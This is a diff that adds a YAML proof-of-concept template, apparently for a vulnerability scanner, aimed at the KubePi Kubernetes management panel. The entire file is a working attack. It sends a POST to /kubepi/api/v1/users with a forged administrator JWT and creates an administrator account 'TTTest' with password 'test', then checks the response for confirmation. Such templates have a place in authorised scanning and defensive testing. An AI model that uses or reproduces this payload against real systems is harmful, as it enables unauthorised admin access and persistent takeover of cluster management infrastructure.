@@ -1,0 +1,34 @@
+name: poc-yaml-K8S管理面板-KubePi-createuser
+description: "任意用户创建,登录方式:TTTest/test"
+method: POST
+headers:
+  Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8"
+  Accept: "application/json"
+  Content-Type: "application/json"
+  Upgrade-Insecure-Requests: 1
+  User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
+  Accept-Encoding: "gzip, deflate"
+  Connection: "close"
+body: >
+  {
+    "authenticate": {
+         "password": "test"
+    },
+    "email": "testtest@TTTest.com",
+    "isAdmin": true,
+    "mfa": {
+            "enable": false
+     },
+    "name": "TTTest",
+    "nickName": "test",
+    "roles": [
+         "Supper User"
+    ]
+  }
+
+path:
+  - /kubepi/api/v1/users
+expression:
+  status: 200
+  body_any:
+    - "testtest@TTTest.com"
